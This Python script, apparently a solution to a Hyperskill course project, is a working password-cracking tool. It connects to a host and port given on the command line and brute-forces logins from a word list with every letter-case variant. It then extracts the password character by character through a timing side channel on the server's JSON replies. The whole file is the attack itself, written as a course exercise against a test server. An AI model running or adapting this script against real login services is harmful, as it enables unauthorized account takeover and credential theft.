# https://hyperskill.org/projects/80?track_id=2

import sys
import socket
import itertools
import json
from datetime import datetime
arg = sys.argv


def new_pass(psw):
    for x in psw:
        dane = [y if y.isdigit() else (y, y.swapcase()) for y in x]
        spr = itertools.product(*dane)
        for y in spr:
            yield "".join(y)

comp_time = datetime.strptime("0:00:00:1", "%H:%M:%S:%f") - datetime.strptime("0:00:00:0", "%H:%M:%S:%f")
msg = {'login': '', 'password': ''}
response = {'result': 'Wrong login!'}
numbers = [chr(x) for x in range(48, 58)]
letters_s = [chr(x) for x in range(97, 123)]
letters_l = [chr(x) for x in range(65, 91)]

with open('logins.txt', 'r') as f:
    hasla = f.read().split()

with socket.socket() as socket_x:
    address = (arg[1], int(arg[2]))
    socket_x.connect(address)
    txt = new_pass(hasla)
    while response["result"] == "Wrong login!":
        msg["login"] = next(txt)
        socket_x.send(json.dumps(msg).encode())
        response = json.loads(socket_x.recv(1024).decode())
    while response["result"] != "Connection success!":
        for lt in "".join(numbers + letters_l + letters_s):
            msg["password"] += lt
            socket_x.send(json.dumps(msg).encode())
            try:
                start = datetime.now()
                response = json.loads(socket_x.recv(1024).decode())
                finish = datetime.now()
            except ConnectionResetError:
                break
            except ConnectionAbortedError:
                break
            if response["result"] != "Connection success!" and finish - start < comp_time:
                msg["password"] = msg["password"][:-1]

msg["password"] = msg["password"][:-1]
print(json.dumps(msg))

